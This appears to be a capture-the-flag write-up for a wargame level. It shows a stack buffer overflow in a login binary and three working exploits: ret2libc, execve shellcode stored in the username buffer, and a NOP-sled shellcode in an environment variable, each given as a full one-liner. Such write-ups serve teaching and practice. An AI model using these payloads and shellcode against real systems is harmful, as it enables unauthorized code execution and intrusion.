# level00
For this binary, `NX` is disabled.

The program waits for username and password entry in `stdin`


## Step 1 : Enter in the program
Once decompiled, we can see that the program compares the username entry with `dat_wil`.

## Step 2 : Figure out the vulnerability
Then, the program compares the password entry with `admin`, but it always performs the failed login message.

Also, the program reads 100 bytes for the password entry with `fgets` and store the input in a buffer of 64 bytes. __This is the vulnerability__

## Step 3 : Find the offset
Find the offset of the instruction pointer by using `gdb` and [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

```console
level01@OverRide:~$ gdb -q level01
(gdb) run
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

- The program segfaults, because it continue to `0x37634136` address.
- `0x37634136` is at the 80th position from the beginning of the buffer. At this positon, it overwrites the program counter: `eip`.

## Exploit with Ret2libc
Overwrite `eip` and make a [__Ret2libc__](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc) attack.

1. Address of system: `(gdb) p system` -> `0xf7e6aed0`
2. Address of exit: `(gdb) p exit` -> `0xf7e5eb70`
3. Address of "/bin/sh": `find &system,+9999999,"/bin/sh"` -> `0xf7f897ec`

```bash
(python -c 'print "dat_wil" + "\n" + "A" * (80) + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | /home/users/level01/level01
```

> The `[::-1]` is used to reverse the string because of the little-endian architecture. see [slicing in python](https://stackoverflow.com/questions/509211/how-slicing-in-python-works).
 
> Dont forget to run the binary with the same environment as in gdb (give the entirer path to the binary and/or unset LINES COLUNMS)
- https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue


- https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it

## Shellcode in username buffer

1. Can't store instruction in the password buffer and go to, it segfaults  
2. Use the username buffer to store the shellcode.  

Username entry is stored in a global variable named `a_user_name` at `0x0804a040`

```bash
objdump -t level01 | grep a_user_name
```  
```console
0804a040 g     O .bss	00000064              a_user_name
```
- Write a shellcode at the end of the buffer
- Return to the address of the `a_user_name` + 7 bytes

> 7 bytes are added to skip the `dat_wil` string and reach the shellcode.

```bash
(python -c 'print "dat_wil" "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\n" + "A" * (80) + "\x08\x04\xa0\x47"[::-1] '; cat) | /home/users/level01/level01
```

shell code [here](https://shell-storm.org/shellcode/files/shellcode-752.html)


## Shellcode in the environment
1. Put a shellcode in an environment variable
2. Get the address of the environment variable
3. Return to the environment variable

### 1. Put a shellcode in an environment variable
```bash
env -i SHELLCODE=$(python -c 'print "\x90" * 512 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') gdb -q level01
```

> unset the environment with `env -i` to avoid the address shifting between the normal execution and the debug mode.

### 2. Get the address of the environment variable
```console
(gdb) b *main
(gdb) r
(gdb) x/5s *((char **)environ + 0)
0xffffdd8d:	 "COLUMNS=169"
0xffffdd99:	 "PWD=/home/users/level01"
0xffffddb1:	 "LINES=41"
0xffffddba:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220...
```

Shellcode is at `0xffffddba` + 512 bytes of `NOP` = `0xffffdfba`

### 3. Return to the environment variable
```bash
(python -c 'print "dat_wil" + "\n" + "A" * 80 + "\xff\xff\xdf\xba"[::-1]'; cat) | env -i SHELLCODE=$(python -c 'print "\x90" * 512 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') /home/users/level01/level01
```